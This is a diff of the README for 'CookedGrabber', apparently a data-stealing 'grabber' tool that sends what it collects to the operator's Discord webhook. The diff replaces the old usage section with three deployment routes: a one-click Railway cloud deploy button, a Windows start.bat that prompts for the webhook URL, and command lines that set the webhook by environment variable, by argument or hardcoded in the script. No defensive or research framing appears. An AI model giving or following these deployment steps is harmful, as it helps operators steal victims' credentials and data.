@@ -44,33 +44,51 @@
 - **Python 3.x** (*python 3.9 used for the project.*)
 - **Modules:** `$ pip install -r requirements.txt`
 
-## How to deploy on Railway ? 🚂 (For Beginners)
+## 🚀 How to deploy and use ? (Out of Box)
 
-It is extremely easy to deploy this grabber on Railway for 24/7 online hosting.
+We provide diverse and simple options to launch the bot depending on your needs.
+
+### Option 1: One-Click Cloud Deployment (Railway) 🚂
+
+It is extremely easy to deploy this grabber on Railway for **24/7 online hosting** without installing anything on your machine.
+
+[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template?template=https%3A%2F%2Fgithub.com%2Fmouadessalim%2FCookedGrabber&envs=WEBHOOK_URL)
 
 1. Create a free account on [Railway.app](https://railway.app/).
-2. Click on **New Project**, then select **Deploy from GitHub repo**.
+2. Click on the button above or manually create a **New Project** and select **Deploy from GitHub repo**.
 3. Choose your forked repository of `CookedGrabber`.
-4. Click **Add Variables**, and create a new variable named `WEBHOOK_URL`.
-5. Paste your Discord Webhook URL as the value for `WEBHOOK_URL` and click **Add**.
-6. Railway will automatically build and deploy your app. The grabber is now active and will use your webhook!
+4. The dashboard will prompt you for the `WEBHOOK_URL` variable. Paste your Discord Webhook URL and click **Deploy**.
+5. Railway will automatically build and deploy your app. The grabber is now active!
 
-## How to use locally ? ❄
+### Option 2: One-Click Local Execution (Windows) 🪟
 
-There is 2 ways to run the script locally.
+If you just want to run the grabber instantly on your Windows machine:
 
-### 1. First way
+1. Make sure you have **Python 3.9+** installed and added to your PATH.
+2. Double-click on the **`start.bat`** file in the project folder.
+3. The script will automatically install all dependencies (`requirements.txt`) for you.
+4. It will then prompt you: `Enter your Discord Webhook URL:`.
+5. Paste your URL, press Enter, and the grabber will execute natively!
 
-You need to add your **webhook(s)** **link(s)** to the script from this line:
-https://github.com/mouadessalim/CookedGrabber/blob/f753c4bea37241d94253a288dd223c5ae8f7f371/CookedGrabber.py#L290
-*You can run the script normaly.*
+### Option 3: Manual Command Line Execution 💻
 
-### 2. Second way
+For advanced users who prefer the terminal:
 
-You can also run the program by giving several arguments (the webhook(s) link(s)):
-```console
-py CookedGrabber.py YOUR WEBHOOK(s) URL(s)
-```
+1. Install dependencies first:
+   ```console
+   pip install -r requirements.txt
+   ```
+2. You can set the Webhook URL as an environment variable before running:
+   ```console
+   set WEBHOOK_URL=https://discord.com/api/webhooks/...
+   py CookedGrabber.py
+   ```
+3. Or pass it as a direct argument to the script:
+   ```console
+   py CookedGrabber.py YOUR_WEBHOOK_URL
+   ```
+4. Alternatively, you can hardcode your **webhook(s)** **link(s)** directly in the script from this line:
+   https://github.com/mouadessalim/CookedGrabber/blob/f753c4bea37241d94253a288dd223c5ae8f7f371/CookedGrabber.py#L290
 
 ## Screenshots 📷
 
